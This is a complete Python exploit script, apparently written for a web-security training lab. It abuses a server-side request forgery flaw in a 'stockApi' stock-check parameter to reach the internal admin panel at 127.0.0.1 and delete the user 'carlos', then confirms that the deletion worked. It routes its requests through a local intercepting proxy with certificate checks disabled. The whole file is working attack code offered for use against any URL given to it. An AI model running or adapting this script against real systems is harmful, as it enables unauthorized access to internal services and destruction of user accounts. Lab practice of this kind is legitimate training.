import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def delete_user(url):
    # Deleting user with SSRF payload
    delete_user_url = "http://127.0.0.1/admin/delete?username=carlos"
    check_stock_path = "/product/stock"
    parameter = {'stockApi': delete_user_url}
    r = requests.post(url + check_stock_path, data=parameter, verify=False, proxies=proxies)

    # Check if user Deleted
    admin_ssrf_payload = "http://127.0.0.1/admin"
    parameter2 = {'stockApi': admin_ssrf_payload}
    r = requests.post(url + check_stock_path, data=parameter2, verify=False, proxies=proxies)
    
    if 'User deleted successfully!' in r.text:
        print("(+) User deleted successfully")
    else:
        print("(-) Unsuccessfull exploit")

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <URL>")
        print(f"(+) Usage Example: python3 {sys.argv[0]} www.domain.com")
        sys.exit(0)
    
    url = sys.argv[1]
    print("(+) Deleting carlos User")
    delete_user(url)

if __name__ == "__main__":
    main()
